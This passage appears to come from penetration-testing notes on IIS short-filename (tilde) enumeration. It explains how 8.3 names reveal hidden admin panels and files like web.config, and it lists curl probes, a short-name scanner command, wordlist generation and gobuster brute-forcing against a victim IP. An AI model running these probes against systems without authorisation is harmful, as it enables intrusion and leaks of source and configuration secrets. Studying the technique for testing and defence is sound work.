
- **Short names** are **case-insensitive** (e.g., `TRANSF~1.ASP` = `transfer.aspx`).
- Access **hidden admin panels** (e.g., `/ADMINI~1/` → `/Administrator/`)
-  Leak **source code** (e.g., `WEB.CON~1` → `web.config`).
#### <span style="color:#FFB86C">**Tools for Enumeration**</span>

- **Manual Method** `curl -I http://$VICTIM_IP/~a`, `curl -I http://$VICTIM_IP/~b ` Look for HTTP 200 responses.
- **Automated Tool**:  `java -jar iis_shortname_scanner.jar 0 5 http://$VICTIM_IP/`

#### <span style="color:#FFB86C">**Finding Full Filenames**</span>
- **Generate a Wordlist**: `egrep -r ^transf $WORDLIST_PATH/* | sed 's/^[^:]*://' > /tmp/list.txt`
- **Brute-Force with Gobuster**: `gobuster dir -u http://$VICTIM_IP/ -w /tmp/list.txt -x .aspx,.asp`

